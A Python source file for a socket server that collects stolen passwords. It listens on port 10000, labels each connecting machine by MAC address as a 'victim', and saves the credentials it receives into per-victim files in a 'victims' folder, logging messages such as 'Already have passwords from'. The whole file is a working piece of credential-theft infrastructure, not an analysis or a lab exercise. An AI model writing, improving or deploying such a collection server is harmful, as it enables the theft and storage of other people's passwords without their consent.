# Made from scratch by Gibraan Jafar

import socket
from subprocess import Popen , PIPE
import subprocess
import os
import socket
import fcntl
import struct


FILE=''
clientsocket=''
serversocket=''


def main():
    create_victims_folder()
    create_socket()
    while True:
        establish_connection()
        mac = get_mac()
        print(" Serving client => ",mac)
        if new_user(mac):
            make_file(mac)
            fill_file()
        clientsocket.close()
        print()


def create_victims_folder():
    if not os.path.isdir('../victims'):
        os.mkdir('../victims')
    os.chdir('../victims')


def create_socket():
    global serversocket
    try:
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = get_ip_address('wlp2s0')
        print("Current ip on wlp2s0 ",ip)
        port = 10000
        server_address = (ip,port)
        serversocket.bind(server_address)
        serversocket.listen(5)
    except:
        print("Socket couldn't be created . Incorrect ip specified !")
        exit(1)

def establish_connection():
    global clientsocket
    clientsocket, addr = serversocket.accept()

	# returns ip of interface specified. Don't understand how it works
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))
    )[20:24])


def get_mac():
    mac = clientsocket.recv(14).decode('ascii')
    return mac

def get_data():
    " Receive data and send it to calling function "
    CONTENT = clientsocket.recv(1000).decode('ascii')
    CONTENT = CONTENT.split('\n')
    return CONTENT


def new_user(intro):
    if os.path.exists(intro):
        print("Already have passwords from =>",intro)
        return False
    else:
        print("New victim detected !")
        return True


def make_file(file_name):
    global FILE
    FILE = open(file_name,'a')

def fill_file():
    content = get_data()
    for item in content:
        FILE.write(item+'\n')

    FILE.close()


if __name__ == "__main__":
    print("=== INITIALIZING SERVER === \n")
    main()




"""
import socket
import fcntl
import struct

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))
    )[20:24])

ip = get_ip_address('lo')
print(ip)
"""
